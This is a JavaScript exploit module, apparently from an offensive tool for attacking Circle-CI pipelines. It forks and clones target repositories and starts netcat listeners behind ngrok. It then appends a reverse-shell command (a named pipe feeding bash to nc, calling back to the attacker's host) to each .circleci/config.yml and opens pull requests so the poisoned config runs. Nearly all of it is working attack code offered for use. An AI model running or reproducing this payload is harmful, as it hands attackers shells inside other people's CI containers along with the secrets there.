const log = console.log,
      chalk = require('chalk'),
      green = chalk.green,
      cyan = chalk.cyan,
      github = require(__dirname + '/../../../lib/gh'),
      files = require(__dirname + '/../../../lib/files'),
      repos = require(__dirname + '/../../../lib/repos'),
      exp = require(__dirname + '/../../../lib/exp'),
      circle = require(__dirname + '/../../../modules/circle'),
      server = require(__dirname + '/../../../lib/server'),
      ng = require(__dirname + '/../../../lib/ng'),
      targets = require(__dirname + '/../../../lib/targets'),
      repodir = __dirname + '/../../../../repos';

module.exports = {

  // This particular run function returns an array of netcat listeners
  run: (callback) => {
    github.githubAuth((err, token, authed_user) => {
      if (err) {
        switch (err.code) {
          case 401:
            console.log(chalk.red('Couldn\'t log you in. Please try again.'));
            break;
          case 422:
            console.log(chalk.red('You already have an access token.'));
            break;
        }
        log(token);
        return callback();
      }
      if (token) {
        const type = "forked";
        let ng_token;

        ng.ngrokAuth((err, ngtoken) => {
          if (err) {
            log(chalk.red(`ERROR with ngrok authentication. ${err}`));
            return callback();
          }
          ng_token = ngtoken;

          //Fork All repos in targets
          repos.forkAll(token, authed_user, () => {

            // Clone all repos that have been forked
            repos.cloneAllRepos(type, authed_user, () => {

              // CREATE CIRCLE SPECIFIC LIST HERE TO USE FROM HERE ON OUT
              targets.getForkedTargetType('circle', authed_user, (raw_targets, circle_targets) => {
                log(chalk.magenta(`Circle targets ${circle_targets}`));
                // Start a netcat listener for each cloned repo
                server.startNetcatAll(circle_targets, (nc_arr, ports_arr, dupIn_arr, dupOut_arr) => {

                  //Push global lists for new shells
                  global.shells_arr.push.apply(global.shells_arr, nc_arr);
                  global.duplexInput_arr.push.apply(global.duplexInput_arr, dupIn_arr);
                  global.duplexOutput_arr.push.apply(global.duplexOutput_arr, dupOut_arr);
                  global.session_name_arr.push.apply(global.session_name_arr, raw_targets);
                  for(let l = 0; l < global.nc_arr ; l++){
                    global.session_exploit_arr.push(module.exports.name());
                  }

                  // Start an Ngrok instance for listening
                  log(green("Starting ngrok Services..."));
                  server.startNgrokAll(ports_arr, ng_token, (err,hostname_arr, port_arr, server_arr, url_arr) => {
                    if (err) {
                      log(err);
                      return callback();
                    }
                    else {
                      // Load the config.yml file into the repos
                      circle.loadCircleConfigAll(module.exports.name(), authed_user, circle_targets, () => {    
                      const append_promises = [];

                        // iterate through list of files, find circle configs and append to the file
                        for (let t in circle_targets) {
                          append_promises.push(new Promise((resolve, reject) => {
                            circle.appendCircleConfig( `${repodir}/${circle_targets[t]}/.circleci/config.yml`,
                              module.exports.injectionString(port_arr[t], hostname_arr[t]));
                            resolve();
                          }).catch(err => {
                            log(err);
                          }));
                        }

                        // Cash in the promises from above
                        Promise.all(append_promises)
                          .then(c => {
                            repos.pullRequestAll(token, type, authed_user, raw_targets, () => {
                              return callback();
                            });
                          });
                      });
                    }
                  });
                });
              });
            });
          });
        });
      }
    });
  },

  name: () => {
    return "circle-ci/netcat_reverse_shell";
  },

  type: () => {
    return "circle";
  },

  info: (cb) => {
    log(cyan("\n---\nINFO\n---\n"));
    log(white(`This exploit takes advantage of open Circle-CI repositories to 
create a netcat connection back to the attacker. The end result
is a shell from which to control the compromised Circle-CI container.\n`));

    log(cyan("ORDER OF EXECUTION\n------------------\n"));
    log(white("1) Fork all targets"));
    log(white("2) Clone all forked targets locally"));
    log(white("3) Start shell handler(s)"));
    log(white("4) Load and poison the .drone.yml file of the cloned repos"));
    log(white("5) Push commited changes, and submit a pull request"));
    return cb();

  },

  injectionString: (port, host) => {
    return `\n          environment:\n            NGPORT: ${port}\n\
            NGHOSTNAME: ${host}\n\
          command: |\n\
            set +e
            mknod /tmp/backpipe p\n\
            /bin/bash 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &\n\
            while true; do sleep 60; echo "Keepalive"; done`;
  },

  options: () => {
    log(green("\n-------\nOPTIONS\n-------\n"));
    log(green("NO OPTIONS. This is the 'easy' exploit. No need to set IPs or ports."));
    // Print options for exploit
  }
}